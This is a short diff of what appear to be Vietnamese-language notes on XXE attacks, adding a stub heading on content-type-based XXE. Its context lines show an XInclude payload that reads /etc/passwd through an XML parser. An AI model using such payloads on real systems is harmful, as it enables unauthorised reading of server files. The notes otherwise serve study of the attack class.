@@ -15,3 +15,7 @@ Khi ta chỉ kiểm soát được 1 phần của xml document(không declared �
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+
+
+# XXE attacks via modified content type
+curious --> read it yourself
